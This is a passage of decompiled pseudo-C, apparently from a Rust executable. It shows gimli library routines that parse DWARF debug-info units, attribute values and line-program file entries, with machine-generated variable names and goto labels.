CONCAT11(uStack1407, uStack1408)));\n        if (CONCAT44(uStack1416._4_4_, uStack1416) != 0x18) {\n            if (CONCAT44(uStack1416._4_4_, uStack1416) == 0x16) {\n                pppppppuStack1576 = NULL;\n                if (uStack544._2_2_ < 5) {\n                    pppppppuStack1576 = pppppppuStack424;\n                }\n                if (*(ppppppppuVar67 + 0x1d) != '\\x01') {\n                    pppppppuStack1576 = NULL;\n                }\n                pppppppuStack1576 = pppppppuStack1576 + iVar37;\n                bVar15 = true;\n            }\n            else {\n                bVar15 = false;\n            }\n            goto code_r0x004282a1;\n        }\n        pppppppuVar70 = ppppppppuVar67[0x1a];\n        uVar45 = ppppppppuVar67[0x1b] - pppppppuStack424;\n        if (pppppppuStack424 <= ppppppppuVar67[0x1b]) {\n            unaff_RDI = uStack544 >> 8;\n            pppppppuVar70 = pppppppuVar70 + pppppppuStack424;\n            cVar19 = uStack544 >> 8;\n            uVar43 = ((cVar19 == '\\b') * 4 + 4) * iVar37;\n            uVar69 = uVar45 - uVar43;\n            if (uVar43 <= uVar45) {\n                pppppppuVar70 = pppppppuVar70 + uVar43;\n                if (cVar19 == '\\b') {\n                    if (7 < uVar69) {\n                        ppppppuVar22 = *pppppppuVar70;\ncode_r0x0042851f:\n                        pppppppuStack1576 = ppppppuVar22 + pppppppuStack424;\n                        bVar15 = true;\n                        goto code_r0x004282a1;\n                    }\n                }\n                else if (3 < uVar69) {\n                    ppppppuVar22 = *pppppppuVar70;\n                    goto code_r0x0042851f;\n                }\n            }\n        }\n        puStack1864[2] = pppppppuVar70;\n        uVar76 = *0x4444ec;\n        uVar74 = *0x4444e8;\n        uVar72 = *0x4444e4;\n        *puStack1864 = *0x4444e0;\n        *(puStack1864 + 4) = uVar72;\n        *(puStack1864 + 1) = uVar74;\n        *(puStack1864 + 0xc) = uVar76;\n        goto code_r0x0042983e;\n    }\n    uVar45 = ppppppppuStack2008[0xb] - ppppppppuStack2064;\n    pppppppuVar70 = pppppppuStack2072;\n    if ((ppppppppuStack2008[0xb] < ppppppppuStack2064) || (uVar45 < 4)) {\ncode_r0x00426f23:\n        pppppppuStack2072 = pppppppuVar70;\n        dbg.drop_in_place<gimli::read::dwarf::Unit<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>>\n                  (&uStack1416);\n        ppppppppuVar67 = ppppppppuStack1936;\n        ppppppppuVar40 = ppppppppuStack1792;\n        ppppppppuVar41 = ppppppppuStack1784;\njoined_r0x00428966:\n        ppppppppuVar53 = ppppppppuVar40;\n        if (ppppppppuVar41 == NULL) goto code_r0x00428c9d;\n        goto code_r0x004257cf;\n    }\n    uVar43 = ppppppppuStack1920 & 0xffffffffffffff00;\n    ppppppppuStack1920 = uVar43 | uStack1344 & 0xff;\n    ppppppppuStack1928 = ppppppppuStack1288;\n    ppppppppuStack1696 = ppppppppuStack1280;\n    puVar25 = ppppppppuStack2008[10] + ppppppppuStack2064;\n    ppppppppuVar41 = uVar45 - 4;\n    uVar24 = *puVar25;\n    if (uVar24 >> 4 < 0xfffffff) {\n        puVar25 = puVar25 + 1;\n        uStack2097 = 4;\n        ppppppppuStack2056 = uVar24;\n    }\n    else {\n        if ((uVar24 != 0xffffffff) || (ppppppppuVar41 < 0x8)) goto code_r0x00426f23;\n        ppppppppuVar41 = uVar45 - 0xc;\n        ppppppppuStack2056 = *(puVar25 + 1);\n        puVar25 = puVar25 + 3;\n        uStack2097 = 8;\n    }\n    if ((ppppppppuVar41 < ppppppppuStack2056) || (ppppppppuStack2056 < 0x2)) goto code_r0x00426f23;\n    pppppppuStack2080 = puVar25 + 2;\n    pppppppuVar70 = ppppppppuStack2056 - 2;\n    uVar27 = *puVar25;\n    ppppppppuStack1944 = uVar27;\n    if (uVar27 - 6 < 0xfffc) goto code_r0x00426f23;\n    if (4 < uVar27) {\n        if ((pppppppuVar70 != NULL) && (pppppppuVar70 != 0x1)) {\n            ppppppppuStack1920 = uVar43 | *pppppppuStack2080;\n            pppppppuStack2080 = puVar25 + 1;\n            pppppppuVar70 = ppppppppuStack2056 - 4;\n            if (*(puVar25 + 3) == '\\0') goto code_r0x00426f93;\n        }\n        goto code_r0x00426f23;\n    }\ncode_r0x00426f93:\n    if (0xffffffef < uVar24) {\n        if (0x7 < pppppppuVar70) {\n            pppppppuVar44 = pppppppuVar70 + -1;\n            pppppppuStack1872 = *pppppppuStack2080;\n            pppppppuStack1752 = pppppppuStack2080 + 1;\n            goto code_r0x00426fd5;\n        }\n        goto code_r0x00426f23;\n    }\n    if (pppppppuVar70 < 0x4) goto code_r0x00426f23;\n    pppppppuVar44 = pppppppuVar70 + -4;\n    pppppppuStack1872 = *pppppppuStack2080;\n    pppppppuStack1752 = pppppppuStack2080 + 4;\ncode_r0x00426fd5:\n    iVar37 = pppppppuVar44 - pppppppuStack1872;\n    if ((pppppppuVar44 < pppppppuStack1872) || (pppppppuStack1872 == NULL)) goto code_r0x00426f23;\n    pppppppuStack2080 = pppppppuStack1752 + 1;\n    pppppppuVar70 = pppppppuStack1872 - 1;\n    cStack1993 = *pppppppuStack1752;\n    if (cStack1993 == '\\0') goto code_r0x00426f23;\n    cStack2081 = '\\x01';\n    pppppppuVar44 = pppppppuStack2080;\n    pppppppuVar61 = pppppppuVar70;\n    if (3 < uVar27) {\n        if ((pppppppuVar70 == NULL) || (cStack2081 = *(pppppppuStack1752 + 1),  cStack2081 == '\\0'))\n        goto code_r0x00426f23;\n        pppppppuVar44 = pppppppuStack1752 + 2;\n        pppppppuVar61 = pppppppuStack1872 - 2;\n    }\n    if (pppppppuVar61 == NULL) goto code_r0x00426f23;\n    pppppppuStack2080 = pppppppuVar44 + 1;\n    pppppppuVar70 = pppppppuVar61 - 1;\n    if ((pppppppuVar70 == NULL) || (pppppppuVar61 == 0x2)) goto code_r0x00426f23;\n    uStack1994 = *pppppppuStack2080;\n    pppppppuStack2080 = pppppppuVar44 + 3;\n    pppppppuVar70 = pppppppuVar61 - 3;\n    cStack1995 = *(pppppppuVar44 + 2);\n    if ((cStack1995 == '\\0') ||\n       ((uStack1996 = *pppppppuVar44 != '\\0',  pppppppuVar70 == NULL ||\n        (ppppppppuStack2032 = pppppppuVar70 & 0xffffffffffffff00 | *(pppppppuVar44 + 3),  *(pppppppuVar44 + 3) == 0))))\n    goto code_r0x00426f23;\n    ppppppppuVar41 = ppppppppuStack2032 - 1U & 0xff;\n    pppppppuStack2072 = (pppppppuVar61 - 4U) - ppppppppuVar41;\n    if (pppppppuVar61 - 4U < ppppppppuVar41) goto code_r0x00426f23;\n    pppppppuStack1888 = pppppppuStack1888 & 0xffffffff00000000 | uVar27;\n    puVar21 = pppppppuVar44 + 4;\n    pppppppuStack2080 = puVar21 + ppppppppuVar41;\n    uStack1568 = 0x8;\n    _auStack1560 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n    if (uVar27 < 5) {\n        _auStack1432 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n        uStack1440 = 0x2;\n        pppppppuVar70 = pppppppuStack2080;\n        pppppppuVar42 = pppppppuStack2072;\n        if (pppppppuStack2072 != NULL) {\n            iVar30 = pppppppuVar44 + pppppppuVar61;\n            pppppppuVar44 = 0x8;\n            pppppppuStack1552 = NULL;\n            while( true ) {\n                pppppppuVar61 = pppppppuStack2080;\n                ppppppuVar33 = NULL;\n                while (*(pppppppuStack2080 + ppppppuVar33) != '\\0') {\n                    iVar60 = pppppppuStack2080 + ppppppuVar33;\n                    ppppppuVar33 = ppppppuVar33 + 1;\n                    pppppppuVar70 = pppppppuStack2080;\n                    pppppppuVar42 = pppppppuStack2072;\n                    if (iVar60 + 1 == iVar30) goto code_r0x00427bfa;\n                }\n                pppppppuVar70 = pppppppuStack2080 + ppppppuVar33;\n                pppppppuVar42 = pppppppuStack2072 - ppppppuVar33;\n                if (pppppppuStack2072 - ppppppuVar33 == NULL) break;\n                pppppppuStack2080 = pppppppuStack2080 + ppppppuVar33 + 1;\n                pppppppuStack2072 = ~ppppppuVar33 + pppppppuStack2072;\n                if (ppppppuVar33 == NULL) goto code_r0x00427605;\n                if (pppppppuStack1552 == auStack1560) {\n                    dbg.reserve_for_push<gimli::read::unit::AttributeValue<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>, alloc::alloc::Global>\n                              (&uStack1568, pppppppuStack1552);\n                    pppppppuVar44 = uStack1568;\n                }\n                pppppppuVar44[pppppppuStack1552 * 3] = 0x1f;\n                pppppppuVar44[pppppppuStack1552 * 3 + 1] = pppppppuVar61;\n                pppppppuVar44[pppppppuStack1552 * 3 + 2] = ppppppuVar33;\n                pppppppuStack1552 = pppppppuStack1552 + 1;\n                iVar30 = pppppppuStack2080 + pppppppuStack2072;\n                bVar71 = false;\n                if (pppppppuStack2072 == NULL) goto code_r0x00427bfc;\n            }\n        }\n    }\n    else {\n        dbg.parse<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                  (auStack1688, &pppppppuStack2080);\n        if (auStack1688 != 0) {\n            bVar71 = true;\n            goto code_r0x00427bfc;\n        }\n        pppppppuStack1968 = uStack1680;\n        uStack1440 = uStack1680;\n        pppppppuStack2016 = uStack1664;\n        _auStack1432 = _auStack1672;\n        iVar23 = 0;\n        pppppppuStack2040 = NULL;\n        while( true ) {\n            pppppppuVar61 = pppppppuStack2072 - 1;\n            pppppppuVar44 = pppppppuStack2080 + 1;\n            pppppppuVar70 = pppppppuStack2080;\n            pppppppuVar42 = pppppppuStack2072;\n            if (pppppppuVar61 == 0xffffffffffffffff) break;\n            uVar55 = *pppppppuStack2080;\n            if ((iVar23 == 0x3f) && (pppppppuVar70 = pppppppuVar44,  pppppppuVar42 = pppppppuVar61,  1 < uVar55)) break;\n            ppppppuVar33 = uVar55;\n            pppppppuStack2040 = pppppppuStack2040 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n            iVar23 = iVar23 + 7;\n            pppppppuStack2080 = pppppppuVar44;\n            pppppppuStack2072 = pppppppuVar61;\n            if (-1 < uVar55) {\n                if (pppppppuStack2040 != NULL) {\n                    if (uStack1664 != NULL) {\n                        pppppppuStack1760 =\n                             pppppppuStack1760 & 0xffffffff00000000 |\n                             ppppppppuStack1920 | uStack2097 << 8 | pppppppuStack1888 << 0x10;\n                        pppppppuStack2016 = uStack1664 << 2;\n                        pppppppuStack1880 = 0x8;\n                        pppppppuStack1952 = NULL;\n                        pppppppuStack2024 = NULL;\n                        while( true ) {\n                            pppppppuStack2024 = pppppppuStack2024 + 1;\n                            uStack1680 = 0x2e;\n                            pppppppuVar44 = NULL;\n                            do {\n                                dbg.parse_attribute<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                                          (auStack1688, &pppppppuStack2080, pppppppuStack1760 & 0xffffffff, \n                                           *(pppppppuStack1968 + 2U + pppppppuVar44));\n                                pppppppuVar70 = pppppppuStack2080;\n                                pppppppuVar42 = pppppppuStack2072;\n                                if (auStack1688 != 0) goto code_r0x00427bfa;\n                                if (*(pppppppuStack1968 + pppppppuVar44) == 1) {\n                                    ppppppuVar22 = auStack1672;\n                                    ppppppuVar33 = uStack1664;\n                                }\n                                pppppppuVar44 = pppppppuVar44 + 4;\n                            } while (pppppppuStack2016 != pppppppuVar44);\n                            if (uStack1680 == 0x2e) break;\n                            if (pppppppuStack1952 == auStack1560) {\n                                dbg.reserve_for_push<gimli::read::unit::AttributeValue<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>, alloc::alloc::Global>\n                                          (&uStack1568, pppppppuStack1952);\n                                pppppppuStack1880 = uStack1568;\n                                pppppppuStack1952 = pppppppuStack1552;\n                            }\n                            pppppppuStack1880[pppppppuStack1952 * 3] = uStack1680;\n                            pppppppuStack1880[pppppppuStack1952 * 3 + 1] = ppppppuVar22;\n                            pppppppuStack1880[pppppppuStack1952 * 3 + 2] = ppppppuVar33;\n                            pppppppuStack1952 = pppppppuStack1952 + 1;\n                            _auStack1560 = CONCAT88(pppppppuStack1952, auStack1560);\n                            if (pppppppuStack2024 == pppppppuStack2040) goto code_r0x00427602;\n                        }\n                    }\n                    dbg.panic(0x44bcbb, 0x2b, 0x449ac0);\n                    goto code_r0x00429a87;\n                }\ncode_r0x00427602:\n                ppppppuVar22 = NULL;\n                goto code_r0x00427605;\n            }\n        }\n    }\n    goto code_r0x00427bfa;\ncode_r0x00426560:\n    ppppppppuVar53 = ppppppppuVar53[uVar45 + 0xa7];\n    goto code_r0x004264fe;\ncode_r0x00427605:\n    uStack1992 = 0x8;\n    _auStack1984 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n    if (ppppppppuStack1944 < 5) {\n        if (ppppppppuStack1928 == NULL) {\n            uVar35 = 0x2e;\n        }\n        else {\n            _auStack1672 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n            _auStack1688 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n            ppppppppuStack1656 = NULL;\n            uVar35 = 0x1f;\n        }\n        uStack1816 = ppppppppuStack1656;\n        _auStack1840 = CONCAT48(auStack1672._0_4_, auStack1840);\n        _auStack1840 = CONCAT412(auStack1672._4_4_, _auStack1840);\n        iStack1824 = SUB162(_auStack1672 >> 0x40, 0);\n        uStack1822 = SUB162(_auStack1672 >> 0x50, 0);\n        uStack1820 = uStack1664._4_4_;\n        ppppppppuStack1848 = SUB168(_auStack1688, 0);\n        auStack1840 = SUB168(_auStack1688 >> 0x40, 0);\n        _auStack1456 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n        uStack1464 = 0x2;\n        pppppppuStack2024 = pppppppuStack2072;\n        pppppppuVar70 = pppppppuStack2080;\n        pppppppuVar44 = pppppppuStack2072;\n        if (pppppppuStack2072 != NULL) {\n            iVar30 = pppppppuStack2080 + pppppppuStack2072;\n            ppppppppuStack1584 = 0x8;\n            pppppppuStack1768 = NULL;\n            while( true ) {\n                pppppppuVar59 = pppppppuStack2072;\n                pppppppuStack2040 = pppppppuStack2080;\n                pppppppuVar61 = pppppppuStack2080 + 4;\n                pppppppuVar42 = pppppppuStack2072 - 4;\n                iVar60 = -2;\n                pppppppuVar34 = 0x1;\n                pppppppuVar62 = 0xffffffffffffffff;\n                pppppppuStack1968 = NULL;\n                while (pppppppuStack2024 = pppppppuVar59,  *(pppppppuStack2080 + pppppppuStack1968) != '\\0') {\n                    iVar32 = pppppppuStack2080 + pppppppuStack1968;\n                    pppppppuStack1968 = pppppppuStack1968 + 1;\n                    iVar60 = iVar60 + -1;\n                    pppppppuVar34 = pppppppuVar34 + 1;\n                    pppppppuVar62 = pppppppuVar62 - 1;\n                    pppppppuVar61 = pppppppuVar61 + 1;\n                    pppppppuVar42 = pppppppuVar42 - 1;\n                    pppppppuVar70 = pppppppuStack2080;\n                    pppppppuVar44 = pppppppuStack2072;\n                    if (iVar32 + 1 == iVar30) goto code_r0x00427b9c;\n                }\n                pppppppuVar70 = pppppppuStack2080 + pppppppuStack1968;\n                pppppppuVar44 = pppppppuStack2072 - pppppppuStack1968;\n                if (pppppppuStack2072 - pppppppuStack1968 == NULL) break;\n                pppppppuStack2080 = pppppppuStack2080 + pppppppuStack1968 + 1;\n                pppppppuVar70 = ~pppppppuStack1968 + pppppppuStack2072;\n                if (pppppppuStack1968 == NULL) {\ncode_r0x004280aa:\n                    pppppppuStack2072 = pppppppuVar70;\n                    pppppppuStack1752 = pppppppuStack1752 + pppppppuStack1872;\n                    _auStack1728 = CONCAT48(uStack1832, auStack1728);\n                    _auStack1728 = CONCAT412(uStack1832._4_4_, _auStack1728);\n                    uStack1712 = CONCAT44(uStack1820, CONCAT22(uStack1822, iStack1824));\n                    auStack1728 = SUB168(_auStack1840, 0);\n                    uStack1736 = ppppppppuStack1848;\n                    ppppppppuStack1704 = uStack1816;\n                    uStack1544 = uStack814;\n                    uStack1540 = uStack810;\n                    uStack776 = uStack1992;\n                    uStack772 = uStack1992._4_4_;\n                    uStack768 = auStack1984._0_4_;\n                    uStack764 = auStack1984._4_4_;\n                    uStack760 = uStack1976;\n                    uStack744 = uStack1464;\n                    uStack740 = uStack1464._4_4_;\n                    uStack736 = auStack1456._0_4_;\n                    uStack732 = auStack1456._4_4_;\n                    uStack728 = uStack1448;\n                    uStack712 = uStack1568;\n                    uStack708 = uStack1568._4_4_;\n                    uStack704 = auStack1560._0_4_;\n                    uStack700 = auStack1560._4_4_;\n                    uStack696 = pppppppuStack1552;\n                    uStack680 = uStack1440;\n                    uStack676 = uStack1440._4_4_;\n                    uStack672 = auStack1432._0_4_;\n                    uStack668 = auStack1432._4_4_;\n                    uStack664 = uStack1424;\n                    goto joined_r0x00426b91;\n                }\n                pppppppuStack1880 = pppppppuStack2072 - 1;\n                iVar23 = 0;\n                pppppppuStack1536 = NULL;\n                pppppppuVar58 = pppppppuStack1968;\n                pppppppuStack2072 = ~pppppppuStack1968 + pppppppuStack2072;\n                do {\n                    pppppppuStack1952 = pppppppuVar62;\n                    pppppppuStack1760 = pppppppuVar61;\n                    pppppppuStack1888 = pppppppuVar42;\n                    pppppppuStack2016 = pppppppuVar34;\n                    pppppppuVar70 = pppppppuStack2080;\n                    pppppppuVar44 = pppppppuStack2072;\n                    if (pppppppuStack1880 == pppppppuVar58) goto code_r0x00427b9c;\n                    pppppppuStack2080 = pppppppuStack2040 + pppppppuVar58 + 2;\n                    pppppppuStack2072 = pppppppuVar59 + iVar60;\n                    uVar55 = *(pppppppuStack2040 + 1U + pppppppuVar58);\n                    if ((iVar23 == 0x3f) &&\n                       (pppppppuVar70 = pppppppuStack2080,  pppppppuVar44 = pppppppuStack2072,  1 < uVar55))\n                    goto code_r0x00427b9c;\n                    pppppppuStack1536 = pppppppuStack1536 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n                    iVar23 = iVar23 + 7;\n                    pppppppuVar58 = pppppppuVar58 + 1;\n                    iVar60 = iVar60 + -1;\n                    pppppppuVar34 = pppppppuStack2016 + 1;\n                    pppppppuVar42 = pppppppuStack1888 - 1;\n                    pppppppuVar61 = pppppppuStack1760 + 1;\n                    pppppppuVar62 = pppppppuStack1952 - 1;\n                } while (uVar55 < '\\0');\n                iVar23 = 0;\n                pppppppuStack2024 = NULL;\n                pppppppuVar42 = pppppppuStack1888;\n                pppppppuVar61 = pppppppuStack1760;\n                do {\n                    pppppppuStack1760 = pppppppuVar61;\n                    pppppppuStack1888 = pppppppuVar42;\n                    pppppppuVar70 = pppppppuStack2080;\n                    pppppppuVar44 = pppppppuStack2072;\n                    if (pppppppuStack1880 == pppppppuStack2016) goto code_r0x00427b9c;\n                    pppppppuStack2080 = pppppppuStack2016 + pppppppuStack2040 + 2;\n                    pppppppuStack2072 = (pppppppuVar59 - 2U) + pppppppuStack1952;\n                    uVar55 = *(pppppppuStack2040 + 1U + pppppppuStack2016);\n                    if ((iVar23 == 0x3f) &&\n                       (pppppppuVar70 = pppppppuStack2080,  pppppppuVar44 = pppppppuStack2072,  1 < uVar55))\n                    goto code_r0x00427b9c;\n                    pppppppuStack2024 = pppppppuStack2024 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n                    iVar23 = iVar23 + 7;\n                    pppppppuStack2016 = pppppppuStack2016 + 1;\n                    pppppppuStack1952 = pppppppuStack1952 - 1;\n                    pppppppuVar61 = pppppppuStack1760 + 1;\n                    pppppppuVar42 = pppppppuStack1888 - 1;\n                } while (uVar55 < '\\0');\n                iVar23 = 0;\n                pppppppuStack2016 = NULL;\n                do {\n                    pppppppuVar34 = pppppppuStack1888;\n                    pppppppuVar59 = pppppppuStack1760;\n                    pppppppuVar70 = pppppppuStack2080;\n                    pppppppuVar44 = pppppppuStack2072;\n                    pppppppuStack1888 = pppppppuVar42;\n                    pppppppuStack1760 = pppppppuVar61;\n                    if ((pppppppuVar34 == 0xffffffffffffffff) ||\n                       ((uVar55 = *(pppppppuVar59 - 1),  iVar23 == 0x3f &&\n                        (pppppppuVar70 = pppppppuVar59,  pppppppuVar44 = pppppppuVar34,  1 < uVar55))))\n                    goto code_r0x00427b9c;\n                    pppppppuStack2016 = pppppppuStack2016 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n                    iVar23 = iVar23 + 7;\n                    pppppppuStack1760 = pppppppuVar59 + 1;\n                    pppppppuStack1888 = pppppppuVar34 - 1;\n                    pppppppuStack2080 = pppppppuVar59;\n                    pppppppuStack2072 = pppppppuVar34;\n                } while (uVar55 < '\\0');\n                _auStack1688 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n                pppppppuStack1888 = pppppppuVar42;\n                pppppppuStack1760 = pppppppuVar61;\n                if (pppppppuStack1768 == auStack1984) {\n                    dbg.reserve_for_push<gimli::read::line::FileEntry<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>, alloc::alloc::Global>\n                              (&uStack1992, pppppppuStack1768);\n                    ppppppppuStack1584 = uStack1992;\n                    pppppppuStack1768 = uStack1976;\n                }\n                ppppppppuStack1584[pppppppuStack1768 * 8] = 0x1f;\n                ppppppppuStack1584[pppppppuStack1768 * 8 + 1] = pppppppuStack2040;\n                ppppppppuStack1584[pppppppuStack1768 * 8 + 2] = pppppppuStack1968;\n                ppppppppuStack1584[pppppppuStack1768 * 8 + 3] = pppppppuStack1536;\n                ppppppppuStack1584[pppppppuStack1768 * 8 + 4] = pppppppuStack2024;\n                ppppppppuStack1584[pppppppuStack1768 * 8 + 5] = pppppppuStack2016;\n                ppppppppuVar67 = ppppppppuStack1584 + pppppppuStack1768 * 8 + 6;\n                *ppppppppuVar67 = auStack1688._0_4_;\n                *(ppppppppuVar67 + 4) = auStack1688._4_4_;\n                *(ppppppppuVar67 + 1) = uStack1680;\n                *(ppppppppuVar67 + 0xc) = uStack1680._4_4_;\n                pppppppuStack1768 = pppppppuStack1768 + 1;\n                _auStack1984 = CONCAT88(pppppppuStack1768, auStack1984);\n                pppppppuStack2040 = pppppppuStack2080;\n                iVar30 = pppppppuStack2080 + pppppppuStack2072;\n                bVar71 = false;\n                pppppppuStack2024 = pppppppuStack2072;\n                if (pppppppuStack2072 == NULL) goto code_r0x00427b9e;\n            }\n        }\ncode_r0x00427b9c:\n        pppppppuStack2072 = pppppppuVar44;\n        pppppppuStack2080 = pppppppuVar70;\n        bVar71 = false;\n    }\n    else {\n        dbg.parse<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                  (auStack1688, &pppppppuStack2080);\n        if (auStack1688 == 0) {\n            pppppppuStack1968 = uStack1680;\n            uStack1464 = uStack1680;\n            pppppppuStack2016 = uStack1664;\n            _auStack1456 = _auStack1672;\n            iVar23 = 0;\n            pppppppuStack2040 = NULL;\n            do {\n                pppppppuVar42 = pppppppuStack2072 - 1;\n                pppppppuVar61 = pppppppuStack2080 + 1;\n                pppppppuVar70 = pppppppuStack2080;\n                pppppppuVar44 = pppppppuStack2072;\n                if (pppppppuVar42 == 0xffffffffffffffff) goto code_r0x00427b9c;\n                uVar55 = *pppppppuStack2080;\n                if ((iVar23 == 0x3f) && (pppppppuVar70 = pppppppuVar61,  pppppppuVar44 = pppppppuVar42,  1 < uVar55))\n                goto code_r0x00427b9c;\n                pppppppuStack2040 = pppppppuStack2040 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n                iVar23 = iVar23 + 7;\n                pppppppuStack2080 = pppppppuVar61;\n                pppppppuStack2072 = pppppppuVar42;\n            } while (uVar55 < '\\0');\n            if (pppppppuStack2040 == NULL) {\ncode_r0x004280a5:\n                uVar35 = 0x2e;\n                pppppppuVar70 = pppppppuStack2072;\n                goto code_r0x004280aa;\n            }\n            if (uStack1664 == NULL) {\n                uStack1796 = uStack1796 & 0xff000000;\n                uStack1800 = 0;\ncode_r0x00429a47:\n                dbg.panic(0x44bcbb, 0x2b, 0x449aa8);\n                goto code_r0x00429a87;\n            }\n            pppppppuStack1760 =\n                 pppppppuStack1760 & 0xffffffff00000000 |\n                 ppppppppuStack1920 | uStack2097 << 8 | pppppppuStack1888 << 0x10;\n            pppppppuStack2016 = uStack1664 << 2;\n            ppppppppuStack856 = 0x8;\n            iStack1592 = 0;\n            pppppppuStack848 = NULL;\n            do {\n                pppppppuStack848 = pppppppuStack848 + 1;\n                uStack1796 = uStack1796 & 0xff000000;\n                uStack1800 = 0;\n                pppppppuStack1888 = 0x2e;\n                pppppppuVar61 = NULL;\n                pppppppuStack1880 = NULL;\n                pppppppuStack2024 = NULL;\n                pppppppuStack1952 = NULL;\n                uStack832 = 0;\n                uStack840 = 0;\n                ppppppppuStack1584 = NULL;\n                do {\n                    dbg.parse_attribute<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (auStack1688, &pppppppuStack2080, pppppppuStack1760 & 0xffffffff, \n                               *(pppppppuStack1968 + 2U + pppppppuVar61));\n                    pppppppuVar70 = pppppppuStack2080;\n                    pppppppuVar44 = pppppppuStack2072;\n                    if (auStack1688 != 0) goto code_r0x00427b9c;\n                    if (*(pppppppuStack1968 + pppppppuVar61) - 1U < 5) {\n    // switch table (5 cases) at 0x429d44\n                        switch(*(pppppppuStack1968 + pppppppuVar61)) {\n                        case 1:\n                            pppppppuStack1768 = auStack1672;\n                            pppppppuStack1536 = uStack1664;\n                            pppppppuStack1888 = uStack1680;\n                            break;\n                        case 2:\n    // switch table (6 cases) at 0x429d88\n                            switch(uStack1680) {\n                            case 0x2:\n                                auStack1672 = auStack1672 & 0xff;\n                            case 0x5:\n                            case 0x7:\ncode_r0x00427edd:\n                                pppppppuStack1880 = auStack1672;\n                                break;\n                            case 0x3:\n                                pppppppuStack1880 = auStack1672 & 0xffff;\n                                break;\n                            case 0x4:\n                                pppppppuStack1880 = auStack1672 & 0xffffffff;\n                                break;\n                            case 0x6:\n                                if (-1 < auStack1672) goto code_r0x00427edd;\n                            }\n                            break;\n                        case 3:\n    // switch table (6 cases) at 0x429d70\n                            switch(uStack1680) {\n                            case 0x2:\n                                auStack1672 = auStack1672 & 0xff;\n                            case 0x5:\n                            case 0x7:\ncode_r0x00427f12:\n                                pppppppuStack2024 = auStack1672;\n                                break;\n                            case 0x3:\n                                pppppppuStack2024 = auStack1672 & 0xffff;\n                                break;\n                            case 0x4:\n                                pppppppuStack2024 = auStack1672 & 0xffffffff;\n                                break;\n                            case 0x6:\n                                if (-1 < auStack1672) goto code_r0x00427f12;\n                            }\n                            break;\n                        case 4:\n    // switch table (6 cases) at 0x429d58\n                            switch(uStack1680) {\n                            case 0x2:\n                                auStack1672 = auStack1672 & 0xff;\n                            case 0x5:\n                            case 0x7:\ncode_r0x00427f47:\n                                pppppppuStack1952 = auStack1672;\n                                break;\n                            case 0x3:\n                                pppppppuStack1952 = auStack1672 & 0xffff;\n                                break;\n                            case 0x4:\n                                pppppppuStack1952 = auStack1672 & 0xffffffff;\n                                break;\n                            case 0x6:\n                                if (-1 < auStack1672) goto code_r0x00427f47;\n                            }\n                            break;\n                        case 5:\n                            if ((uStack1680 == 0x1) && (uStack1664 == 0x10)) {\n                                uStack832 = *(auStack1672 + 7);\n                                ppppppppuStack1584 = *(auStack1672 + 0xf);\n                                uStack840 = *(auStack1672 + 1);\n                                uStack1800 = *auStack1672 & 0xffffff | *(auStack1672 + 3) << 0x18;\n                                uStack1796 = uStack1796 & 0xff000000 | *(auStack1672 + 3) >> 8;\n                            }\n                        }\n                    }\n                    pppppppuVar61 = pppppppuVar61 + 4;\n                } while (pppppppuStack2016 != pppppppuVar61);\n                if (pppppppuStack1888 == 0x2e) goto code_r0x00429a47;\n                uStack1492 = uStack1492 & 0xff000000 | uStack1796 & 0xffffff;\n                uStack1496 = uStack1800;\n                if (iStack1592 == auStack1984) {\n                    dbg.reserve_for_push<gimli::read::line::FileEntry<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>, alloc::alloc::Global>\n                              (&uStack1992, iStack1592);\n                    ppppppppuStack856 = uStack1992;\n                    iStack1592 = uStack1976;\n                }\n                iVar30 = iStack1592 * 0x40;\n                ppppppppuStack856[iStack1592 * 8] = pppppppuStack1888;\n                ppppppppuStack856[iStack1592 * 8 + 1] = pppppppuStack1768;\n                ppppppppuStack856[iStack1592 * 8 + 2] = pppppppuStack1536;\n                ppppppppuStack856[iStack1592 * 8 + 3] = pppppppuStack1880;\n                ppppppppuStack856[iStack1592 * 8 + 4] = pppppppuStack2024;\n                ppppppppuStack856[iStack1592 * 8 + 5] = pppppppuStack1952;\n                *(ppppppppuStack856 + iStack1592 * 8 + 6) = uStack1496;\n                *(ppppppppuStack856 + iVar30 + 0x33) = CONCAT31(uStack1492, uStack1496._3_1_);\n                *(ppppppppuStack856 + iVar30 + 0x37) = uStack832;\n                *(ppppppppuStack856 + iVar30 + 0x3e) = uStack840 >> 0x30;\n                *(ppppppppuStack856 + iVar30 + 0x3c) = uStack840 >> 0x20;\n                *(ppppppppuStack856 + iStack1592 * 8 + 7) = uStack840;\n                *(ppppppppuStack856 + iVar30 + 0x3f) = ppppppppuStack1584;\n                iStack1592 = iStack1592 + 1;\n                _auStack1984 = CONCAT88(iStack1592, auStack1984);\n                if (pppppppuStack848 == pppppppuStack2040) goto code_r0x004280a5;\n            } while( true );\n        }\n        bVar71 = true;\n    }\ncode_r0x00427b9e:\n    if ((auStack1984 != NULL) && ((_auStack1984 & 0x3ffffffffffffff) != 0x0)) {\n        sym.__rust_dealloc(uStack1992, 8);\n    }\n    pppppppuVar70 = pppppppuStack2080;\n    pppppppuVar42 = pppppppuStack2072;\n    if (((!bVar71) && (auStack1456 != 0)) && ((_auStack1456 